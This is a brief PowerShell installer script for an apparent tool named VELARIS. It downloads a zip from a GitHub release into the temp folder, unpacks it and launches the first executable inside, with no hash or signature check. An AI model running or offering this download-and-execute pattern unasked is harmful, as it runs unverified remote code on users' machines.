Write-Host "VELARIS INSTALL STARTED..." -ForegroundColor Cyan

$zip = "$env:TEMP\velaris.zip"
$folder = "$env:TEMP\VELARIS"

Invoke-WebRequest "https://github.com/ah5e/velarislab1/releases/download/v1.0/VELARIS.zip" -OutFile $zip
Expand-Archive -Path $zip -DestinationPath $folder -Force

$exe = Get-ChildItem $folder -Recurse -Filter "*.exe" | Select-Object -First 1

if ($exe) {
    Start-Process $exe.FullName
} else {
    Write-Host "ERROR: No EXE found inside ZIP" -ForegroundColor Red
}
